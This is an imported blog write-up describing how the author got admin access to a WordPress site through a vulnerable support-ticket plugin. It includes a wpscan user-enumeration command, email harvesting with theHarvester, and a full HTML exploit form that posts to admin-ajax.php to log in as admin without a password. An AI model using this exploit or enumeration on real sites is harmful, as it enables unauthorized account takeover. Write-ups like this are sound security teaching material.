---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-04-02_privilege-escalation-hello-admin.md
original_filename: 2020-04-02_privilege-escalation-hello-admin.md
title: Privilege Escalation - Hello Admin
category: documents
detected_topics:
- access-control
- command-injection
- otp
tags:
- imported
- documents
- access-control
- command-injection
- otp
language: en
raw_sha256: e28721e14869193548953bdcb4b70984830258a12958fdfdfc4f0cc02418620d
text_sha256: 101d1326f5c397abbef7a80e59851485b39352166ca013d26c02b761b3e6f415
ingested_at: '2026-06-28T07:32:01Z'
sensitivity: unknown
redactions_applied: false
---

# Privilege Escalation - Hello Admin

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-04-02_privilege-escalation-hello-admin.md
- Source Type: markdown
- Detected Topics: access-control, command-injection, otp
- Ingested At: 2026-06-28T07:32:01Z
- Redactions Applied: False
- Raw SHA256: `e28721e14869193548953bdcb4b70984830258a12958fdfdfc4f0cc02418620d`
- Text SHA256: `101d1326f5c397abbef7a80e59851485b39352166ca013d26c02b761b3e6f415`


## Content

---
title: "Privilege Escalation - Hello Admin"
url: "https://medium.com/@shahjerry33/privilege-escalation-hello-admin-a53ac14fd388"
authors: ["Shrey Shah (@ShreySh43332033)"]
bugs: ["Privilege escalation"]
publication_date: "2020-04-02"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4674
scraped_via: "browseros"
---

# Privilege Escalation - Hello Admin

Top highlight

Privilege Escalation - Hello Admin
Jerry Shah (Jerry)
Follow
4 min read
·
Apr 2, 2020

293

1

Summary :

Hello everyone, today I’m going to show you how I found a Privilege Escalation in WordPress website that was using a vulnerable plugin. I was using wappalyzer and was able to detect that the website was using WordPress CMS (Content Management System), so the first thing I tried was “wpscan” and got so many vulnerable plugins and some default credentials so I exploited the vulnerability using one exploit available on exploit-db.

What is Privilege Escalation ?

Privilege escalation, in simple words, means getting privileges to access something that should not be accessible. Attackers use various privilege escalation techniques to access unauthorized resources.

Privilege escalation was possible because the plugin was using a vulnerable function called “wp_set_auth_cookie()”

What is wp_set_auth_cookie() function ?

This function filters the duration of the authentication cookie expiration period and also checks if the connection is secure or not. It is also used to secure a login cookie and fires immediately before the authentication cookie is set.

Syntax :

wp_set_auth_cookie( int $user_id, bool $remember = false, bool|string $secure =’ ’, string $token = ‘ ‘)

It sets the authentication cookies based on user ID.

Description :

The $remember parameter increases the time that the cookie will be kept. The default the cookie is kept without remembering is two days. When $remember is set, the cookies will be kept for 14 days or two weeks.

Parameters :

$user_id

(int) (Required) User ID.

$remember

(bool) (Optional) Whether to remember the user.

Default value: false

$secure

(bool|string) (Optional) Whether the auth cookie should only be sent over HTTPS. Default is an empty string which means the value of is_ssl() will be used.

Default value: ‘ ’

$token

(string) (Optional) User’s session token to use for this cookie.

Default value: ‘ ’

Get Jerry Shah (Jerry)’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Vulnerable Code :

Press enter or click to view image in full size
Vulnerable Code

How to find this vulnerability ?

Go to your target website that is using WordPress CMS
Use the wpscan tool to check for the out-dated plugins, themes, default credentials etc.

My command : wpscan --url https://target.com --disable-tls-check --enumerate u

--url : to pass the URL
--disable-tls-check : disables SSL/TLS certificate verification
--enumerate u : to enumerate the users
Press enter or click to view image in full size
WordPress Scan

After the scan is completed you’ll get the result of out-dated and vulnerable things.

3. In my case it was vulnerable to “WP Support Plus Responsive Ticket System”

Press enter or click to view image in full size
Vulnerable

4. Another thing I found was default username

Press enter or click to view image in full size
Default Username

5. I searched for the vulnerability on google and found an exploit on https://www.exploit-db.com/

Press enter or click to view image in full size
Exploit

6. Then I saw the exploit code and it was a simple HTML login form

<form method="post" action="http://target.com/wp-admin/admin-ajax.php">
	Username: <input type="text" name="username" value="admin">
	<input type="hidden" name="email" value="EMAIL">
	<input type="hidden" name="action" value="loginGuestFacebook">
	<input type="submit" value="Login">
</form>
Then go to admin panel.

So I saved it as .html and ran the script but before that I saw that it needs an email for exploiting it, so I enumerated the site using “theharvester” tool (https://github.com/laramies/theHarvester) and found 4 emails out of which one helped me to make the exploit successful.

7. Then I ran a simple python script for transferring file via port 80

Press enter or click to view image in full size
Python HTTP Server

8. I ran the exploit which I saved as .html and got a successful login to admin

Press enter or click to view image in full size
Exploit

9. As you can see we are logged in as admin without knowing the password. It happened because of incorrect usage of wp_set_auth_cookie().

Press enter or click to view image in full size
Logged In as Admin

Thank You :)

Instagram : jerry._.3
